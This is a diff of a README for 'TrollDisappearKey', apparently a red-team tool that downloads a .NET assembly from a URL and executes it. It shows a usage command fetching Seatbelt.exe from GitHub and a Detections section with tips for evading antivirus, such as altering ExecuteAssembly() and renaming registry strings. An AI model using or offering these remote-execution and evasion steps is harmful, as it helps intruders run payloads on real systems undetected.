@@ -23,10 +23,10 @@ TrollDisappearKey.exe <URL TO .EXE ASSEMBLY> <ARGUMENT1,ARGUMENT2>
 TrollDisappearKey.exe "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Seatbelt.exe" "AMSIProviders"
 ```
 ## Detections 
-Not too bad since zero effort to evade detection, there's tons of things to improve but i shall leave it to the reader
-you can immediately drop it to maybe 5 by altering the ExecuteAssembly() function since its using standard code that's deemed malicious
-Can rename certain strings the the reg key path 
-Avoid the use of certain API calls and improve the hook library further
+Not too bad since zero effort to evade detection, there's tons of things to improve but i shall leave it to the reader \
+you can immediately drop it to maybe 5 by altering the ExecuteAssembly() function since its using standard code that's deemed malicious \
+Can rename certain strings the the reg key path  \
+Avoid the use of certain API calls and improve the hook library further \
 ![Image](https://github.com/user-attachments/assets/246e956a-9a64-45c8-b3a8-0acf7b7cb5b8)
 
 ## Features
